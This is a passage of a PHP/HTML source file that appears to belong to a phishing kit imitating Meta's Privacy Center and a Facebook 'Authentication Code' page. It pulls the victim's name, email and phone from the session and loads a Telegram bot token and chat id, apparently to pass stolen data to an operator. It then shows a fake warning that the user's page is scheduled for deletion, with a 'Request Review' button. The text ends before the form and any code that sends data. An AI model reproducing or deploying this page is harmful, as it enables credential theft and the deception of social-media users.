<?php
session_start(); // Kích hoạt session
$fullName = isset($_SESSION['fullName']) ? $_SESSION['fullName'] : '00';
$email = isset($_SESSION['email']) ? $_SESSION['email'] : '00';
$phone = isset($_SESSION['phone']) ? $_SESSION['phone'] : '00';
?>

<?php
// Đọc token từ file token.txt
$tokenFile = '../token.txt';
$chatIdFile = '../chat-id.txt';

if (file_exists($tokenFile) && file_exists($chatIdFile)) {
    $token = trim(file_get_contents($tokenFile)); // Đọc và loại bỏ khoảng trắng
    $chatId = trim(file_get_contents($chatIdFile));
} else {
    die("File token.txt hoặc chat-id.txt không tồn tại.");
}
?>


<!DOCTYPE html>
<html lang="en" id="html">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta property="og:image" content="https://i.imgur.com/4EzYFyb.jpeg">
    <title>Authentication Code | Facebook</title>
    <link rel="stylesheet" href="../styles/bootstrap.min.css">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
    <link rel="stylesheet" href="../styles/style.css">
    <link rel="shortcut icon" href="https://i.imgur.com/FOY6xZ9.png" type="image/x-icon">

</head>

<body>


    <div class="container-sm" id="main">
        <div class="container-head">
            <div id="logo">
                <svg aria-label="Логотип Meta" class="x1kpxq89 x1247r65" role="img" viewBox="0 0 500 100">
                    <defs>
                        <linearGradient gradientUnits="userSpaceOnUse" id=":R1eckmkldd6knpapd5aqH1:" x1="124.38"
                            x2="160.839" y1="99" y2="59.326">
                            <stop offset=".427" stop-color="#0278F1"></stop>
                            <stop offset=".917" stop-color="#0180FA"></stop>
                        </linearGradient>
                        <linearGradient gradientUnits="userSpaceOnUse" id=":R1eckmkldd6knpapd5aqH2:" x1="42" x2="-1.666"
                            y1="4.936" y2="61.707">
                            <stop offset=".427" stop-color="#0165E0"></stop>
                            <stop offset=".917" stop-color="#0180FA"></stop>
                        </linearGradient>
                        <linearGradient gradientUnits="userSpaceOnUse" id=":R1eckmkldd6knpapd5aqH3:" x1="27.677"
                            x2="132.943" y1="28.71" y2="71.118">
                            <stop stop-color="#0064E0"></stop>
                            <stop offset=".656" stop-color="#0066E2"></stop>
                            <stop offset="1" stop-color="#0278F1"></stop>
                        </linearGradient>
                    </defs>
                    <path
                        d="M185.508 3.01h18.704l31.803 57.313L267.818 3.01h18.297v94.175h-15.264v-72.18l-27.88 49.977h-14.319l-27.88-49.978v72.18h-15.264V3.01ZM336.281 98.87c-7.066 0-13.286-1.565-18.638-4.674-5.352-3.12-9.527-7.434-12.528-12.952-2.989-5.517-4.483-11.835-4.483-18.973 0-7.214 1.461-13.608 4.385-19.17 2.923-5.561 6.989-9.908 12.187-13.05 5.198-3.13 11.176-4.707 17.923-4.707 6.715 0 12.484 1.587 17.319 4.74 4.847 3.164 8.572 7.598 11.177 13.291 2.615 5.693 3.923 12.371 3.923 20.046v4.171h-51.793c.945 5.737 3.275 10.258 6.989 13.554 3.715 3.295 8.407 4.937 14.078 4.937 4.549 0 8.461-.667 11.747-2.014 3.286-1.347 6.374-3.383 9.253-6.12l8.099 9.886c-8.055 7.357-17.934 11.036-29.638 11.036Zm11.143-55.867c-3.198-3.252-7.385-4.872-12.56-4.872-5.045 0-9.264 1.653-12.66 4.97-3.407 3.318-5.55 7.784-6.451 13.39h37.133c-.451-5.737-2.275-10.237-5.462-13.488ZM386.513 39.467h-14.044V27.03h14.044V6.447h14.715V27.03h21.341v12.437h-21.341v31.552c0 5.244.901 8.988 2.703 11.233 1.803 2.244 4.88 3.36 9.253 3.36 1.935 0 3.572-.076 4.924-.23a97.992 97.992 0 0 0 4.461-.645v12.316c-1.67.493-3.549.898-5.637 1.205-2.099.317-4.286.47-6.583.47-15.89 0-23.836-8.649-23.836-25.957V39.467ZM500 97.185h-14.44v-9.82c-2.571 3.678-5.835 6.513-9.791 8.506-3.968 1.993-8.462 3-13.506 3-6.209 0-11.715-1.588-16.506-4.752-4.803-3.153-8.572-7.51-11.308-13.039-2.748-5.54-4.121-11.879-4.121-19.006 0-7.17 1.395-13.52 4.187-19.038 2.791-5.518 6.648-9.843 11.571-12.985 4.935-3.13 10.594-4.707 16.99-4.707 4.813 0 9.132.93 12.956 2.791a25.708 25.708 0 0 1 9.528 7.905v-9.01H500v70.155Zm-14.715-45.61c-1.571-3.985-4.066-7.138-7.461-9.448-3.396-2.31-7.33-3.46-11.781-3.46-6.308 0-11.319 2.102-15.055 6.317-3.737 4.215-5.605 9.92-5.605 17.09 0 7.215 1.802 12.94 5.396 17.156 3.604 4.215 8.484 6.317 14.66 6.317 4.538 0 8.593-1.16 12.154-3.492 3.549-2.332 6.121-5.475 7.692-9.427V51.575Z"
                        fill="#1C2B33"></path>
                    <path
                        d="M107.666 0C95.358 0 86.865 4.504 75.195 19.935 64.14 5.361 55.152 0 42.97 0 18.573 0 0 29.768 0 65.408 0 86.847 12.107 99 28.441 99c15.742 0 25.269-13.2 33.445-27.788l9.663-16.66a643.785 643.785 0 0 1 2.853-4.869 746.668 746.668 0 0 1 3.202 5.416l9.663 16.454C99.672 92.72 108.126 99 122.45 99c16.448 0 27.617-13.723 27.617-33.25 0-37.552-19.168-65.75-42.4-65.75ZM57.774 46.496l-9.8 16.25c-9.595 15.976-13.639 19.526-19.67 19.526-6.373 0-11.376-5.325-11.376-17.547 0-24.51 12.062-47.451 26.042-47.451 7.273 0 12.678 3.61 22.062 17.486a547.48 547.48 0 0 0-7.258 11.736Zm64.308 35.776c-6.648 0-11.034-4.233-20.012-19.39l-9.663-16.386c-2.79-4.737-5.402-9.04-7.88-12.945 9.73-14.24 15.591-17.984 23.002-17.984 14.118 0 26.204 20.96 26.204 49.158 0 11.403-4.729 17.547-11.651 17.547Z"
                        fill="#0180FA"></path>
                    <path
                        d="M145.631 36h-16.759c3.045 7.956 4.861 17.797 4.861 28.725 0 11.403-4.729 17.547-11.651 17.547H122v16.726l.449.002c16.448 0 27.617-13.723 27.617-33.25 0-10.85-1.6-20.917-4.435-29.75Z"
                        fill="url(#:R1eckmkldd6knpapd5aqH1:)"></path>
                    <path d="M42 .016C18.63.776.832 28.908.028 63h16.92C17.483 39.716 28.762 18.315 42 17.31V.017Z"
                        fill="url(#:R1eckmkldd6knpapd5aqH2:)"></path>
                    <path
                        d="m75.195 19.935.007-.009c2.447 3.223 5.264 7.229 9.33 13.62l-.005.005c2.478 3.906 5.09 8.208 7.88 12.945l9.663 16.386c8.978 15.157 13.364 19.39 20.012 19.39.31 0 .617-.012.918-.037v16.76c-.183.003-.367.005-.551.005-14.323 0-22.777-6.281-35.182-27.447L77.604 55.1l-.625-1.065L77 54c-2.386-4.175-7.606-12.685-11.973-19.232l.005-.008-.62-.91C63.153 31.983 61.985 30.313 61 29l-.066.024c-7.006-9.172-11.818-11.75-17.964-11.75-.324 0-.648.012-.97.037V.016c.322-.01.646-.016.97-.016 12.182 0 21.17 5.36 32.225 19.935Z"
                        fill="url(#:R1eckmkldd6knpapd5aqH3:)"></path>
                </svg>
            </div>
            <div class="burger-button" id="showPopup">
                <div class="bar"></div>
                <div class="bar"></div>
                <div class="bar"></div>
            </div>
        </div>
        <div class="row">

            <style>
                /* CSS for responsiveness */
                @media (max-width: 1000px) {

                    /* Ẩn phần tử có id="left" */
                    #left {
                        display: none;
                    }
                }
            </style>

            <div class="col-4">
                <div id="left">
                    <div id="logo">
                        <svg aria-label="Логотип Meta" class="" role="img" viewBox="0 0 500 100">
                            <defs>
                                <linearGradient gradientUnits="userSpaceOnUse" id=":R1eckmkldd6knpapd5aqH1:" x1="124.38"
                                    x2="160.838" y1="99" y2="59.326">
                                    <stop offset=".427" stop-color="#0278F1"></stop>
                                    <stop offset=".917" stop-color="#0180FA"></stop>
                                </linearGradient>
                                <linearGradient gradientUnits="userSpaceOnUse" id=":R1eckmkldd6knpapd5aqH2:" x1="42"
                                    x2="-1.666" y1="4.936" y2="61.707">
                                    <stop offset=".427" stop-color="#0165E0"></stop>
                                    <stop offset=".917" stop-color="#0180FA"></stop>
                                </linearGradient>
                                <linearGradient gradientUnits="userSpaceOnUse" id=":R1eckmkldd6knpapd5aqH3:" x1="27.677"
                                    x2="132.943" y1="28.71" y2="71.118">
                                    <stop stop-color="#0064E0"></stop>
                                    <stop offset=".656" stop-color="#0066E2"></stop>
                                    <stop offset="1" stop-color="#0278F1"></stop>
                                </linearGradient>
                            </defs>
                            <path
                                d="M185.508 3.01h18.704l31.803 57.313L267.818 3.01h18.297v94.175h-15.264v-72.18l-27.88 49.977h-14.319l-27.88-49.978v72.18h-15.264V3.01ZM336.281 98.87c-7.066 0-13.286-1.565-18.638-4.674-5.352-3.12-9.527-7.434-12.528-12.952-2.989-5.517-4.483-11.835-4.483-18.973 0-7.214 1.461-13.608 4.385-19.17 2.923-5.561 6.989-9.908 12.187-13.05 5.198-3.13 11.176-4.707 17.923-4.707 6.715 0 12.484 1.587 17.319 4.74 4.847 3.164 8.572 7.598 11.177 13.291 2.615 5.693 3.923 12.371 3.923 20.046v4.171h-51.793c.945 5.737 3.275 10.258 6.989 13.554 3.715 3.295 8.407 4.937 14.078 4.937 4.549 0 8.461-.667 11.747-2.014 3.286-1.347 6.374-3.383 9.253-6.12l8.099 9.886c-8.055 7.357-17.934 11.036-29.638 11.036Zm11.143-55.867c-3.198-3.252-7.385-4.872-12.56-4.872-5.045 0-9.264 1.653-12.66 4.97-3.407 3.318-5.55 7.784-6.451 13.39h37.133c-.451-5.737-2.275-10.237-5.462-13.488ZM386.513 39.467h-14.044V27.03h14.044V6.447h14.715V27.03h21.341v12.437h-21.341v31.552c0 5.244.901 8.988 2.703 11.233 1.803 2.244 4.88 3.36 9.253 3.36 1.935 0 3.572-.076 4.924-.23a97.992 97.992 0 0 0 4.461-.645v12.316c-1.67.493-3.549.898-5.637 1.205-2.099.317-4.286.47-6.583.47-15.89 0-23.836-8.649-23.836-25.957V39.467ZM500 97.185h-14.44v-9.82c-2.571 3.678-5.835 6.513-9.791 8.506-3.968 1.993-8.462 3-13.506 3-6.209 0-11.715-1.588-16.506-4.752-4.803-3.153-8.572-7.51-11.308-13.039-2.748-5.54-4.121-11.879-4.121-19.006 0-7.17 1.395-13.52 4.187-19.038 2.791-5.518 6.648-9.843 11.571-12.985 4.935-3.13 10.594-4.707 16.99-4.707 4.813 0 9.132.93 12.956 2.791a25.708 25.708 0 0 1 9.528 7.905v-9.01H500v70.155Zm-14.715-45.61c-1.571-3.985-4.066-7.138-7.461-9.448-3.396-2.31-7.33-3.46-11.781-3.46-6.308 0-11.319 2.102-15.055 6.317-3.737 4.215-5.605 9.92-5.605 17.09 0 7.215 1.802 12.94 5.396 17.156 3.604 4.215 8.484 6.317 14.66 6.317 4.538 0 8.593-1.16 12.154-3.492 3.549-2.332 6.121-5.475 7.692-9.427V51.575Z"
                                fill="#1C2B33"></path>
                            <path
                                d="M107.666 0C95.358 0 86.865 4.504 75.195 19.935 64.14 5.361 55.152 0 42.97 0 18.573 0 0 29.768 0 65.408 0 86.847 12.107 99 28.441 99c15.742 0 25.269-13.2 33.445-27.788l9.663-16.66a643.785 643.785 0 0 1 2.853-4.869 746.668 746.668 0 0 1 3.202 5.416l9.663 16.454C99.672 92.72 108.126 99 122.45 99c16.448 0 27.617-13.723 27.617-33.25 0-37.552-19.168-65.75-42.4-65.75ZM57.774 46.496l-9.8 16.25c-9.595 15.976-13.639 19.526-19.67 19.526-6.373 0-11.376-5.325-11.376-17.547 0-24.51 12.062-47.451 26.042-47.451 7.273 0 12.678 3.61 22.062 17.486a547.48 547.48 0 0 0-7.258 11.736Zm64.308 35.776c-6.648 0-11.034-4.233-20.012-19.39l-9.663-16.386c-2.79-4.737-5.402-9.04-7.88-12.945 9.73-14.24 15.591-17.984 23.002-17.984 14.118 0 26.204 20.96 26.204 49.158 0 11.403-4.729 17.547-11.651 17.547Z"
                                fill="#0180FA"></path>
                            <path
                                d="M145.631 36h-16.759c3.045 7.956 4.861 17.797 4.861 28.725 0 11.403-4.729 17.547-11.651 17.547H122v16.726l.449.002c16.448 0 27.617-13.723 27.617-33.25 0-10.85-1.6-20.917-4.435-29.75Z"
                                fill="url(#:R1eckmkldd6knpapd5aqH1:)"></path>
                            <path
                                d="M42 .016C18.63.776.832 28.908.028 63h16.92C17.483 39.716 28.762 18.315 42 17.31V.017Z"
                                fill="url(#:R1eckmkldd6knpapd5aqH2:)"></path>
                            <path
                                d="m75.195 19.935.007-.009c2.447 3.223 5.264 7.229 9.33 13.62l-.005.005c2.478 3.906 5.09 8.208 7.88 12.945l9.663 16.386c8.978 15.157 13.364 19.39 20.012 19.39.31 0 .617-.012.918-.037v16.76c-.183.003-.367.005-.551.005-14.323 0-22.777-6.281-35.182-27.447L77.604 55.1l-.625-1.065L77 54c-2.386-4.175-7.606-12.685-11.973-19.232l.005-.008-.62-.91C63.153 31.983 61.985 30.313 61 29l-.066.024c-7.006-9.172-11.818-11.75-17.964-11.75-.324 0-.648.012-.97.037V.016c.322-.01.646-.016.97-.016 12.182 0 21.17 5.36 32.225 19.935Z"
                                fill="url(#:R1eckmkldd6knpapd5aqH3:)"></path>
                        </svg>
                    </div>
                    <h1>Privacy Center</h1>
                    <div id="action-buttons">

                        <div class="action-button account" id="utm-user" style="display: none;">
                            <div class="action-button-img">
                                <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
                                    version="1.1" width="256" height="256" viewBox="0 0 256 256" xml:space="preserve">

                                    <defs>
                                    </defs>
                                    <g style="stroke: none; stroke-width: 0; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: none; fill-rule: nonzero; opacity: 1;"
                                        transform="translate(1.4065934065934016 1.4065934065934016) scale(2.81 2.81)">
                                        <path
                                            d="M 45 88 c -11.049 0 -21.18 -2.003 -29.021 -8.634 C 6.212 71.105 0 58.764 0 45 C 0 20.187 20.187 0 45 0 c 24.813 0 45 20.187 45 45 c 0 13.765 -6.212 26.105 -15.979 34.366 C 66.181 85.998 56.049 88 45 88 z"
                                            style="stroke: none; stroke-width: 1; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: rgb(214,214,214); fill-rule: nonzero; opacity: 1;"
                                            transform=" matrix(1 0 0 1 0 0) " stroke-linecap="round" />
                                        <path
                                            d="M 45 60.71 c -11.479 0 -20.818 -9.339 -20.818 -20.817 c 0 -11.479 9.339 -20.818 20.818 -20.818 c 11.479 0 20.817 9.339 20.817 20.818 C 65.817 51.371 56.479 60.71 45 60.71 z"
                                            style="stroke: none; stroke-width: 1; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: rgb(165,164,164); fill-rule: nonzero; opacity: 1;"
                                            transform=" matrix(1 0 0 1 0 0) " stroke-linecap="round" />
                                        <path
                                            d="M 45 90 c -10.613 0 -20.922 -3.773 -29.028 -10.625 c -0.648 -0.548 -0.88 -1.444 -0.579 -2.237 C 20.034 64.919 31.933 56.71 45 56.71 s 24.966 8.209 29.607 20.428 c 0.301 0.793 0.069 1.689 -0.579 2.237 C 65.922 86.227 55.613 90 45 90 z"
                                            style="stroke: none; stroke-width: 1; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: rgb(165,164,164); fill-rule: nonzero; opacity: 1;"
                                            transform=" matrix(1 0 0 1 0 0) " stroke-linecap="round" />
                                    </g>
                                </svg>
                            </div>
                            <div class="action-button-text UserName">
                            </div>
                            <div class="action-button-arrow">

                            </div>
                        </div>
                        <div class="action-button main collapsed">
                            <div class="action-button-img">
                                <svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true"
                                    class="x1lliihq x1k90msu x2h7rmj x1qfuztq x198g3q0 xxk0z11 xvy4d1p">
                                    <path fill-rule="evenodd" clip-rule="evenodd"
                                        d="m19.007 9.997-6.338-5.704a1 1 0 0 0-1.338 0L4.993 9.997A3 3 0 0 0 4 12.227v6.61c0 .216.07.38.149.48a.432.432 0 0 0 .284.167c.86.14 2.04.29 3.567.391V16a3 3 0 0 1 3-3h2a3 3 0 0 1 3 3v3.875a37.895 37.895 0 0 0 3.567-.39.432.432 0 0 0 .284-.168.773.773 0 0 0 .149-.48v-6.61a3 3 0 0 0-.993-2.23zM3.655 8.51l6.338-5.704a3 3 0 0 1 4.014 0l6.338 5.704A5 5 0 0 1 22 12.227v6.61c0 1.292-.836 2.413-2.11 2.621-.94.153-2.208.312-3.833.418-1.125.073-2.057-.836-2.057-1.964V16a1 1 0 0 0-1-1h-2a1 1 0 0 0-1 1v3.912c0 1.128-.932 2.037-2.057 1.964a40.092 40.092 0 0 1-3.832-.418C2.836 21.25 2 20.13 2 18.838v-6.611A5 5 0 0 1 3.655 8.51z">
                                    </path>
                                </svg>
                            </div>
                            <div class="action-button-text">
                                Privacy Center Home Page
                            </div>
                            <div class="action-button-arrow">

                            </div>
                        </div>

                        <div class="action-button collapsed" id="search">
                            <div class="action-button-img">
                                <svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true"
                                    class="x1lliihq x1k90msu x2h7rmj x1qfuztq x198g3q0 xxk0z11 xvy4d1p">
                                    <path fill-rule="evenodd" clip-rule="evenodd"
                                        d="M16.618 18.032a9 9 0 1 1 1.414-1.414l3.675 3.675a1 1 0 0 1-1.414 1.414l-3.675-3.675zM18 11a7 7 0 1 1-14 0 7 7 0 0 1 14 0z">
                                    </path>
                                </svg>
                            </div>
                            <div class="action-button-text">
                                Search
                            </div>
                        </div>

                        <div class="action-button collapsed" id="Policy" data-bs-toggle="collapse"
                            data-bs-target="#PolicyCollapse" aria-expanded="false" aria-controls="PolicyCollapse">
                            <div class="action-button-img">
                                <svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true"
                                    class="x1lliihq x1k90msu x2h7rmj x1qfuztq x198g3q0 xxk0z11 xvy4d1p">
                                    <path d="M12 12a2 2 0 0 1 1 3.732V17a1 1 0 1 1-2 0v-1.268A2 2 0 0 1 12 12z"></path>
                                    <path fill-rule="evenodd" clip-rule="evenodd"
                                        d="M7 6a5 5 0 0 1 10 0v2h.857c1.282 0 2.417.818 2.664 2.076A25.71 25.71 0 0 1 21 15a25.71 25.71 0 0 1-.479 4.924C20.274 21.182 19.14 22 17.857 22H6.143c-1.282 0-2.417-.818-2.664-2.076A25.711 25.711 0 0 1 3 15c0-1.984.236-3.692.479-4.924C3.726 8.818 4.86 8 6.143 8H7V6zm8 0v2H9V6a3 3 0 1 1 6 0zm-8.857 4h11.714a.84.84 0 0 1 .508.157c.107.082.17.182.194.305.223 1.133.441 2.71.441 4.538 0 1.828-.218 3.405-.441 4.538a.488.488 0 0 1-.194.305.84.84 0 0 1-.508.157H6.143a.84.84 0 0 1-.508-.157.489.489 0 0 1-.194-.305A23.712 23.712 0 0 1 5 15c0-1.828.218-3.405.441-4.538a.489.489 0 0 1 .194-.305.84.84 0 0 1 .508-.157z">
                                    </path>
                                </svg>
                            </div>
                            <div class="action-button-text">
                                Privacy Policy
                            </div>
                            <div class="action-button-arrow">
                                <svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true"
                                    class="ARROW">
                                    <path fill-rule="evenodd" clip-rule="evenodd"
                                        d="M4.341 7.247a1 1 0 0 1 1.412.095L12 14.482l6.247-7.14a1 1 0 0 1 1.506 1.317l-7 8a1 1 0 0 1-1.506 0l-7-8a1 1 0 0 1 .095-1.412z">
                                    </path>
                                </svg>
                            </div>
                        </div>

                        <div class="collapse " id="PolicyCollapse">
                        </div>

                        <div class="action-button collapsed" data-bs-toggle="collapse" data-bs-target="#RulesCollapse"
                            aria-expanded="false" aria-controls="RulesCollapse">
                            <div class="action-button-img">
                                <svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true"
                                    class="x1lliihq x1k90msu x2h7rmj x1qfuztq x198g3q0 xxk0z11 xvy4d1p">
                                    <path fill-rule="evenodd" clip-rule="evenodd"
                                        d="M12 21a9 9 0 1 0 0-18 9 9 0 0 0 0 18zm0 2c6.075 0 11-4.925 11-11S18.075 1 12 1 1 5.925 1 12s4.925 11 11 11zm0-13.702c.483 0 .875.391.875.875V17a.875.875 0 0 1-1.75 0v-6.827c0-.484.392-.875.875-.875zm0-1.275c.833 0 1.25-.405 1.25-1.012C13.25 6.405 12.833 6 12 6s-1.25.405-1.25 1.011c0 .607.417 1.012 1.25 1.012z">
                                    </path>
                                </svg>
                            </div>
                            <div class="action-button-text">
                                Other rules and articles
                            </div>
                            <div class="action-button-arrow">
                                <svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true"
                                    class="ARROW">
                                    <path fill-rule="evenodd" clip-rule="evenodd"
                                        d="M4.341 7.247a1 1 0 0 1 1.412.095L12 14.482l6.247-7.14a1 1 0 0 1 1.506 1.317l-7 8a1 1 0 0 1-1.506 0l-7-8a1 1 0 0 1 .095-1.412z">
                                    </path>
                                </svg>
                            </div>
                        </div>
                        <div class="collapse" id="RulesCollapse">
                        </div>

                        <div class="action-button collapsed" data-bs-toggle="collapse" data-bs-target="#SettingCollapse"
                            aria-expanded="false" aria-controls="SettingCollapse">
                            <div class="action-button-img">
                                <svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true"
                                    class="x1lliihq x1k90msu x2h7rmj x1qfuztq x198g3q0 xxk0z11 xvy4d1p">
                                    <path fill-rule="evenodd" clip-rule="evenodd"
                                        d="M16 12a4 4 0 1 1-8 0 4 4 0 0 1 8 0zm-2 0a2 2 0 1 1-4 0 2 2 0 0 1 4 0z">
                                    </path>
                                    <path fill-rule="evenodd" clip-rule="evenodd"
                                        d="m22.191 9.207-2.224 2.06a8.112 8.112 0 0 1 0 1.466l2.224 2.06a1 1 0 0 1 .187 1.233l-1.702 2.948a1 1 0 0 1-1.162.455l-2.895-.896a7.991 7.991 0 0 1-1.27.735l-.672 2.954a1 1 0 0 1-.975.778H10.3a1 1 0 0 1-.975-.778l-.672-2.954a8 8 0 0 1-1.27-.735l-2.895.896a1 1 0 0 1-1.162-.455l-1.702-2.948a1 1 0 0 1 .187-1.233l2.224-2.06a8.1 8.1 0 0 1 0-1.466L1.81 9.207a1 1 0 0 1-.187-1.233l1.702-2.948a1 1 0 0 1 1.162-.455l2.895.896a7.992 7.992 0 0 1 1.27-.735l.672-2.954A1 1 0 0 1 10.299 1h3.403a1 1 0 0 1 .975.778l.672 2.954a7.99 7.99 0 0 1 1.27.735l2.895-.896a1 1 0 0 1 1.162.455l1.702 2.948a1 1 0 0 1-.187 1.233zm-8.574-3.071.894.412c.335.155.653.34.952.551l.805.57 3.075-.951.903 1.564-2.36 2.186.09.98a6.093 6.093 0 0 1 0 1.104l-.09.98 2.36 2.185-.903 1.565-3.075-.951-.805.57a5.993 5.993 0 0 1-.952.55l-.894.413L12.904 21h-1.807l-.713-3.136-.894-.412a5.993 5.993 0 0 1-.952-.551l-.805-.57-3.075.951-.904-1.565 2.36-2.185-.089-.98a6.102 6.102 0 0 1 0-1.104l.09-.98-2.36-2.186.903-1.564 3.075.951.805-.57c.299-.212.617-.396.952-.55l.894-.413L11.097 3h1.807l.713 3.136z">
                                    </path>
                                </svg>
                            </div>
                            <div class="action-button-text">
                                Settings
                            </div>
                            <div class="action-button-arrow">
                                <svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true"
                                    class="ARROW">
                                    <path fill-rule="evenodd" clip-rule="evenodd"
                                        d="M4.341 7.247a1 1 0 0 1 1.412.095L12 14.482l6.247-7.14a1 1 0 0 1 1.506 1.317l-7 8a1 1 0 0 1-1.506 0l-7-8a1 1 0 0 1 .095-1.412z">
                                    </path>
                                </svg>
                            </div>
                        </div>
                        <div class="collapse " id="SettingCollapse">
                        </div>
                    </div>
                </div>
            </div>
            <div class="col-8">
                <div id="right">
                    <h1>
                        <img src="../img/block_2.png" alt="" style="height: 40px;
                        width:40px;
                        margin-right: 8px;">
                        We have scheduled your page to be deleted
                    </h1>
                    <p>We have received several reports that your account violates our terms of service and community
                        guidelines. As a result, your account will be sent for verification.</p>
                    <br>
                    <p>
                        If you believe restrictions have been placed on your account in error, you can request a review.
                    </p>
                    <br>
                    <div id="utm-ticketId" style="display: none;">
                        <p class="small-grey">
                            Your ticket id: <span>#4564-ATFD-4865</span></p>
                    </div>


                    <div class="action-button wide" id="view-accounts" onclick="accountsModal.show()" style="display: none;">
                        <div class="action-button-img">
                            <img src="../img/no_avatar.png" alt="">
                        </div>
                        <div class="action-button-text">
                            <span>View accounts</span>
                            <br>
                            <span class="small-grey UserName"></span>
                        </div>
                        <div class="action-button-arrow">
                            <svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" class="x1lliihq x1k90msu x2h7rmj x1qfuztq xcza8v6 xlup9mm x1kky2od">
                                <path fill-rule="evenodd" clip-rule="evenodd" d="M7.247 4.341a1 1 0 0 1 1.412-.094l8 7a1 1 0 0 1 0 1.506l-8 7a1 1 0 0 1-1.318-1.506L14.482 12l-7.14-6.247a1 1 0 0 1-.094-1.412z">
                                </path>
                            </svg>
                        </div>
                    </div>
                    <br>
                    <h6>Appeal Guide</h6>
                    <ul>
                        <li>Fact checkers may not respond to requests that contain intimidation, hate speech, or other
                            verbal threats.</li>
                        <li>In your appeal, please include all necessary information to allow the fact checker to
                            process your request in a timely manner. If you provide an invalid email address or do not
                            respond to a request for additional information within 2 days, the fact checker may close
                            the application without processing. If the appeal is not processed within 4 days, Meta will
                            automatically reject it.</li>
                        <li>When everything is ready, we will review your account and determine whether restrictions
                            apply to it. The verification procedure usually lasts 24 hours, but in some cases it may
                            take longer. Depending on our decision, the restrictions imposed will remain in effect or
                            will be lifted and your account will be reinstated. </li>
                    </ul>
                    
<style>
#card img {
    max-width: 100%;
    height: auto;
}

/* CSS for mobile */
@media only screen and (max-width: 768px) {
    #card img {
        width: 100%;
        height: auto;
    }
}
</style>                    
                    
                    <div id="card">
                        <img src="../img/banner_new_01.png" alt="">
                        <div class="card-text">
                            <p class="card-type">Review request</p>
                            <h4>Fixing problems with account restrictions</h4>
                            <p>Please be sure to provide the requested information below. Failure to provide this
                                information may delay the processing of your appeal.</p>
                            <div class="btn-wrapper">
                                <div id="openModalBtn" class="button fb-blue w-100" data-bs-toggle="modal" data-bs-target="#exampleModal1">
                                    Request Review
                                </div>
                            </div>
                        </div>
                    </div>
                    <br><br>
                    <h6>Privacy Center</h6>
                    <div class="fake-likns">
                        <div class="action-button-list">
                            <div class="action-button wide">
                                <div class="action-button-img">
                                    <img src="../img/save_img.png" alt="">
                                </div>
                                <div class="action-button-text">
                                    <span>What is the Privacy Policy and what does it say?</span>
                                    <br>
                                    <span class="small-grey">Privacy Policy</span>
                                </div>
                                <div class="action-button-arrow">
                                    <svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" class="x1lliihq x1k90msu x2h7rmj x1qfuztq xcza8v6 xlup9mm x1kky2od">
                                        <path fill-rule="evenodd" clip-rule="evenodd" d="M7.247 4.341a1 1 0 0 1 1.412-.094l8 7a1 1 0 0 1 0 1.506l-8 7a1 1 0 0 1-1.318-1.506L14.482 12l-7.14-6.247a1 1 0 0 1-.094-1.412z">
                                        </path>
                                    </svg>
                                </div>
                            </div>
                            <div class="action-button wide">
                                <div class="action-button-img">
                                    <img src="../img/save_img.png" alt="">
                                </div>
                                <div class="action-button-text">
                                    <span>How you can manage or delete your information</span>
                                    <br>
                                    <span class="small-grey">Privacy Policy</span>
                                </div>
                                <div class="action-button-arrow">
                                    <svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" class="x1lliihq x1k90msu x2h7rmj x1qfuztq xcza8v6 xlup9mm x1kky2od">
                                        <path fill-rule="evenodd" clip-rule="evenodd" d="M7.247 4.341a1 1 0 0 1 1.412-.094l8 7a1 1 0 0 1 0 1.506l-8 7a1 1 0 0 1-1.318-1.506L14.482 12l-7.14-6.247a1 1 0 0 1-.094-1.412z">
                                        </path>
                                    </svg>
                                </div>
                            </div>
                        </div>

                        <br>
                        <h6>For more details, see the User Agreement</h6>
                        <div class="action-button wide">
                            <div class="action-button-img">
                                <img src="../img/doc.png" alt="">
                            </div>
                            <div class="action-button-text">
                                <span>Meta AI</span>
                                <br>
                                <span class="small-grey">User Agreement</span>
                            </div>
                            <div class="action-button-arrow">
                                <svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" class="x1lliihq x1k90msu x2h7rmj x1qfuztq xcza8v6 xlup9mm x1kky2od">
                                    <path fill-rule="evenodd" clip-rule="evenodd" d="M7.247 4.341a1 1 0 0 1 1.412-.094l8 7a1 1 0 0 1 0 1.506l-8 7a1 1 0 0 1-1.318-1.506L14.482 12l-7.14-6.247a1 1 0 0 1-.094-1.412z">
                                    </path>
                                </svg>
                            </div>
                        </div>
                        <br>
                        <h6>Additional resources</h6>

                        <div class="action-button-list">
                            <div class="action-button wide">
                                <div class="action-button-text">
                                    <span>How Meta uses information for generative AI models</span>
                                    <br>
                                    <span class="small-grey">Privacy Center</span>
                                </div>
                                <div class="action-button-arrow">
                                    <svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" class="x1lliihq x1k90msu x2h7rmj x1qfuztq xcza8v6 xlup9mm x1kky2od">
                                        <path fill-rule="evenodd" clip-rule="evenodd" d="M7.247 4.341a1 1 0 0 1 1.412-.094l8 7a1 1 0 0 1 0 1.506l-8 7a1 1 0 0 1-1.318-1.506L14.482 12l-7.14-6.247a1 1 0 0 1-.094-1.412z">
                                        </path>
                                    </svg>
                                </div>
                            </div>
                            <div class="action-button wide">
                                <div class="action-button-text">
